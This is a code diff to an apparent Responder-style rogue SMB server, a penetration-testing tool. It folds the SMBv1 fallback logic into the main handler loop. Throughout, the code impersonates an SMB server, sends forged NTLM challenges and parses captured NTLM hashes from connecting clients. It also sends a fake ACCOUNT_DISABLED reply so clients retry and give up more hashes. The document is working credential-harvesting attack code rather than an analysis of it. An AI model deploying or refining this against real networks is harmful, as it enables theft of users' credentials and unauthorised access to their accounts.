@@ -439,7 +439,7 @@ class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 suppor
 							print(color("[!] SMB2: Error sending session response: %s" % str(e), 1))
 						break
 
-				# Enhanced SMBv2 Negotiate Protocol Response
+				# Handle SMBv2 packets first (following original SMB1 pattern)
 				if data[8:10] == b"\x72\x00" and re.search(rb"SMB 2.\?\?\?", data) and data[4:5] == b"\xfe":
 					if settings.Config.Verbose:
 						print(color("[+] SMB2: Handling SMBv2 negotiate request", 2))
@@ -459,7 +459,6 @@ class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 suppor
 							print(color("[!] SMB2: Error in SMBv2 negotiate: %s" % str(e), 1))
 						break
 
-				# Enhanced SMBv2 Negotiate Protocol Response with SMB 3.x support
 				elif data[16:18] == b"\x00\x00" and data[4:5] == b"\xfe":
 					if settings.Config.Verbose:
 						print(color("[+] SMB2: Handling SMBv2 negotiate response", 2))
@@ -480,7 +479,6 @@ class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 suppor
 							print(color("[!] SMB2: Error in SMBv2 negotiate response: %s" % str(e), 1))
 						break
 
-				# Enhanced SMBv2 Session Setup
 				elif data[16:18] == b"\x01\x00" and data[4:5] == b"\xfe":
 					if settings.Config.Verbose:
 						print(color("[+] SMB2: Handling SMBv2 session setup", 2))
@@ -500,7 +498,6 @@ class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 suppor
 							print(color("[!] SMB2: Error in SMBv2 session setup: %s" % str(e), 1))
 						break
 
-				# Enhanced SMBv2 Session Setup Response
 				elif data[16:18] == b'\x01\x00' and GrabMessageID(data)[0:1] == b'\x02' or GrabMessageID(data)[0:1] == b'\x03' and data[4:5] == b'\xfe':
 					if settings.Config.Verbose:
 						print(color("[+] SMB2: Handling SMBv2 session setup response", 2))
@@ -524,19 +521,148 @@ class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 suppor
 							print(color("[!] SMB2: Error in SMBv2 session setup response: %s" % str(e), 1))
 						break
 
-				# Fall back to SMBv1 handling for compatibility
-				else:
+				# Fall back to SMBv1 handling for compatibility (following original SMB1 pattern)
+				elif data[8:10] == b'\x72\x00' and data[4:5] == b'\xff' and re.search(rb'SMB 2.\?\?\?', data) == None:
 					if settings.Config.Verbose:
-						print(color("[+] SMB2: Falling back to SMBv1 handling", 3))
-					result_data = self.handle_smbv1(data, Challenge)
-					if result_data is None:
+						print(color("[+] SMB2: Falling back to SMBv1 negotiate", 3))
+					self.connection_state = "SMBV1_NEGOTIATE"
+					Header = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
+					Body = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(NetworkRecvBufferPython2or3(data)))
+					Body.calculate()
+			
+					packet1 = str(Header)+str(Body)
+					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
+
+					try:
+						self.request.send(NetworkSendBufferPython2or3(Buffer))
+						data = self.request.recv(1024)
 						if settings.Config.Verbose:
-							print(color("[+] SMB2: SMBv1 handling completed, ending connection", 3))
+							print(color("[+] SMB2: Sent SMBv1 negotiate response, received %d bytes" % len(data), 3))
+					except Exception as e:
+						if settings.Config.Verbose:
+							print(color("[!] SMB2: Error sending SMBv1 negotiate response: %s" % str(e), 1))
 						break
+
+				elif data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # Session Setup AndX Request smbv1
+					if settings.Config.Verbose:
+						print(color("[+] SMB2: Handling SMBv1 session setup", 3))
+					self.connection_state = "SMBV1_SESSION_SETUP"
+					IsNT4ClearTxt(data, self.client_address[0])
+					
+					# STATUS_MORE_PROCESSING_REQUIRED
+					Header = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",mid=midcalc(NetworkRecvBufferPython2or3(data)))
+					if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
+						Body = SMBSession1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
 					else:
-						data = result_data
+						Body = SMBSession1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
+					Body.calculate()
+			
+					packet1 = str(Header)+str(Body)
+					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
+
+					try:
+						self.request.send(NetworkSendBufferPython2or3(Buffer))
+						data = self.request.recv(1024)
 						if settings.Config.Verbose:
-							print(color("[+] SMB2: SMBv1 handling returned %d bytes, continuing" % len(data), 3))
+							print(color("[+] SMB2: Sent SMBv1 session setup challenge, received %d bytes" % len(data), 3))
+					except Exception as e:
+						if settings.Config.Verbose:
+							print(color("[!] SMB2: Error sending SMBv1 session setup response: %s" % str(e), 1))
+						break
+
+					if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # STATUS_SUCCESS
+						if Is_Anonymous(data):
+							if settings.Config.Verbose:
+								print(color("[+] SMB2: Anonymous login detected", 3))
+							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
+							Body = SMBSessEmpty()
+
+							packet1 = str(Header)+str(Body)
+							Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
+
+							try:
+								self.request.send(NetworkSendBufferPython2or3(Buffer))
+								if settings.Config.Verbose:
+									print(color("[+] SMB2: Sent anonymous response", 3))
+							except Exception as e:
+								if settings.Config.Verbose:
+									print(color("[!] SMB2: Error sending anonymous response: %s" % str(e), 1))
+								break
+
+						else:
+							# Parse NTLMSSP_AUTH packet
+							if settings.Config.Verbose:
+								print(color("[+] SMB2: Parsing NTLM hash", 3))
+							ParseSMBHash(data,self.client_address[0], Challenge)
+
+							if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
+								# Send ACCOUNT_DISABLED to get multiple hashes if there are any
+								if settings.Config.Verbose:
+									print(color("[+] SMB2: Sending ACCOUNT_DISABLED for multiple hash capture", 3))
+								Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
+								Body = SMBSessEmpty()
+
+								packet1 = str(Header)+str(Body)
+								Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
+
+								try:
+									self.request.send(NetworkSendBufferPython2or3(Buffer))
+									self.ntry += 1
+									if settings.Config.Verbose:
+										print(color("[+] SMB2: Sent ACCOUNT_DISABLED, continuing for more hashes", 3))
+									continue
+								except Exception as e:
+									if settings.Config.Verbose:
+										print(color("[!] SMB2: Error sending ACCOUNT_DISABLED: %s" % str(e), 1))
+									break
+
+							# Send STATUS_SUCCESS
+							if settings.Config.Verbose:
+								print(color("[+] SMB2: Sending STATUS_SUCCESS", 3))
+							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid=tidcalc(NetworkRecvBufferPython2or3(data)),uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
+							Body = SMBSession2Accept()
+							Body.calculate()
+
+							packet1 = str(Header)+str(Body)
+							Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
+
+							try:
+								self.request.send(NetworkSendBufferPython2or3(Buffer))
+								data = self.request.recv(1024)
+								if settings.Config.Verbose:
+									print(color("[+] SMB2: Sent STATUS_SUCCESS, received %d bytes" % len(data), 3))
+							except Exception as e:
+								if settings.Config.Verbose:
+									print(color("[!] SMB2: Error sending STATUS_SUCCESS: %s" % str(e), 1))
+								break
+
+				elif data[8:10] == b"\x75\x00" and data[4:5] == b"\xff":  # Tree Connect AndX Request
+					if settings.Config.Verbose:
+						print(color("[+] SMB2: Handling tree connect request", 3))
+					self.connection_state = "SMBV1_TREE_CONNECT"
+					ParseShare(data)
+					Header = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(NetworkRecvBufferPython2or3(data)), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(NetworkRecvBufferPython2or3(data)))
+					Body = SMBTreeData()
+					Body.calculate()
+
+					packet1 = str(Header)+str(Body)
+					Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
+
+					try:
+						self.request.send(NetworkSendBufferPython2or3(Buffer))
+						data = self.request.recv(1024)
+						if settings.Config.Verbose:
+							print(color("[+] SMB2: Sent tree connect response, received %d bytes" % len(data), 3))
+					except Exception as e:
+						if settings.Config.Verbose:
+							print(color("[!] SMB2: Error sending tree connect response: %s" % str(e), 1))
+						break
+
+				else:
+					# Unknown packet type
+					if settings.Config.Verbose:
+						print(color("[+] SMB2: Unknown packet type, command: 0x%02x%02x, version: 0x%02x" % (data[8], data[9], data[4]), 3))
+					break
 
 		except Exception as e:
 			if settings.Config.Verbose:
@@ -549,159 +675,3 @@ class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 suppor
 		finally:
 			if settings.Config.Verbose:
 				print(color("[+] SMB2: Connection ended for %s" % getattr(self, 'client_ip', 'unknown'), 3))
-
-	def handle_smbv1(self, data, Challenge):
-		"""Handle SMBv1 traffic for compatibility"""
-		try:
-			# Get client IP safely
-			client_ip = getattr(self, 'client_ip', 'unknown')
-			
-			# Negotiate Protocol Response smbv1
-			if data[8:10] == b'\x72\x00' and data[4:5] == b'\xff' and re.search(rb'SMB 2.\?\?\?', data) == None:
-				if settings.Config.Verbose:
-					print(color("[+] SMB2: Falling back to SMBv1 negotiate", 3))
-				self.connection_state = "SMBV1_NEGOTIATE"
-				Header = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
-				Body = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(NetworkRecvBufferPython2or3(data)))
-				Body.calculate()
-		
-				packet1 = str(Header)+str(Body)
-				Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
-
-				try:
-					self.request.send(NetworkSendBufferPython2or3(Buffer))
-					data = self.request.recv(1024)
-					if settings.Config.Verbose:
-						print(color("[+] SMB2: Sent SMBv1 negotiate response, received %d bytes" % len(data), 3))
-				except Exception as e:
-					if settings.Config.Verbose:
-						print(color("[!] SMB2: Error sending SMBv1 negotiate response: %s" % str(e), 1))
-					return None
-
-			if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # Session Setup AndX Request smbv1
-				if settings.Config.Verbose:
-					print(color("[+] SMB2: Handling SMBv1 session setup", 3))
-				self.connection_state = "SMBV1_SESSION_SETUP"
-				IsNT4ClearTxt(data, self.client_address[0])
-				
-				# STATUS_MORE_PROCESSING_REQUIRED
-				Header = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",mid=midcalc(NetworkRecvBufferPython2or3(data)))
-				if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
-					Body = SMBSession1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
-				else:
-					Body = SMBSession1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
-				Body.calculate()
-		
-				packet1 = str(Header)+str(Body)
-				Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
-
-				try:
-					self.request.send(NetworkSendBufferPython2or3(Buffer))
-					data = self.request.recv(1024)
-					if settings.Config.Verbose:
-						print(color("[+] SMB2: Sent SMBv1 session setup challenge, received %d bytes" % len(data), 3))
-				except Exception as e:
-					if settings.Config.Verbose:
-						print(color("[!] SMB2: Error sending SMBv1 session setup response: %s" % str(e), 1))
-					return None
-
-				if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # STATUS_SUCCESS
-					if Is_Anonymous(data):
-						if settings.Config.Verbose:
-							print(color("[+] SMB2: Anonymous login detected", 3))
-						Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
-						Body = SMBSessEmpty()
-
-						packet1 = str(Header)+str(Body)
-						Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
-
-						try:
-							self.request.send(NetworkSendBufferPython2or3(Buffer))
-							if settings.Config.Verbose:
-								print(color("[+] SMB2: Sent anonymous response", 3))
-						except Exception as e:
-							if settings.Config.Verbose:
-								print(color("[!] SMB2: Error sending anonymous response: %s" % str(e), 1))
-							return None
-
-					else:
-						# Parse NTLMSSP_AUTH packet
-						if settings.Config.Verbose:
-							print(color("[+] SMB2: Parsing NTLM hash", 3))
-						ParseSMBHash(data,self.client_address[0], Challenge)
-
-						if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
-							# Send ACCOUNT_DISABLED to get multiple hashes if there are any
-							if settings.Config.Verbose:
-								print(color("[+] SMB2: Sending ACCOUNT_DISABLED for multiple hash capture", 3))
-							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid="\x00\x00",uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
-							Body = SMBSessEmpty()
-
-							packet1 = str(Header)+str(Body)
-							Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
-
-							try:
-								self.request.send(NetworkSendBufferPython2or3(Buffer))
-								self.ntry += 1
-								if settings.Config.Verbose:
-									print(color("[+] SMB2: Sent ACCOUNT_DISABLED, continuing for more hashes", 3))
-								return data  # Continue the loop for more hashes
-							except Exception as e:
-								if settings.Config.Verbose:
-									print(color("[!] SMB2: Error sending ACCOUNT_DISABLED: %s" % str(e), 1))
-								return None
-
-						# Send STATUS_SUCCESS
-						if settings.Config.Verbose:
-							print(color("[+] SMB2: Sending STATUS_SUCCESS", 3))
-						Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(NetworkRecvBufferPython2or3(data)),tid=tidcalc(NetworkRecvBufferPython2or3(data)),uid=uidcalc(NetworkRecvBufferPython2or3(data)),mid=midcalc(NetworkRecvBufferPython2or3(data)))
-						Body = SMBSession2Accept()
-						Body.calculate()
-
-						packet1 = str(Header)+str(Body)
-						Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
-
-						try:
-							self.request.send(NetworkSendBufferPython2or3(Buffer))
-							data = self.request.recv(1024)
-							if settings.Config.Verbose:
-								print(color("[+] SMB2: Sent STATUS_SUCCESS, received %d bytes" % len(data), 3))
-						except Exception as e:
-							if settings.Config.Verbose:
-								print(color("[!] SMB2: Error sending STATUS_SUCCESS: %s" % str(e), 1))
-							return None
-
-			if data[8:10] == b"\x75\x00" and data[4:5] == b"\xff":  # Tree Connect AndX Request
-				if settings.Config.Verbose:
-					print(color("[+] SMB2: Handling tree connect request", 3))
-				self.connection_state = "SMBV1_TREE_CONNECT"
-				ParseShare(data)
-				Header = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(NetworkRecvBufferPython2or3(data)), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(NetworkRecvBufferPython2or3(data)))
-				Body = SMBTreeData()
-				Body.calculate()
-
-				packet1 = str(Header)+str(Body)
-				Buffer = StructPython2or3('>i', str(packet1))+str(packet1)
-
-				try:
-					self.request.send(NetworkSendBufferPython2or3(Buffer))
-					data = self.request.recv(1024)
-					if settings.Config.Verbose:
-						print(color("[+] SMB2: Sent tree connect response, received %d bytes" % len(data), 3))
-				except Exception as e:
-					if settings.Config.Verbose:
-						print(color("[!] SMB2: Error sending tree connect response: %s" % str(e), 1))
-					return None
-
-			# Return the data to continue processing in the main loop
-			return data
-
-		except Exception as e:
-			if settings.Config.Verbose:
-				print(color("[!] SMB2 SMBv1 fallback error: %s" % str(e), 1))
-				print(color("[!] SMB2 Connection state: %s" % getattr(self, 'connection_state', 'UNKNOWN'), 1))
-				import traceback
-				traceback.print_exc()
-			else:
-				print(color("[!] SMB2 SMBv1 fallback error: %s" % str(e), 1))
-			return None
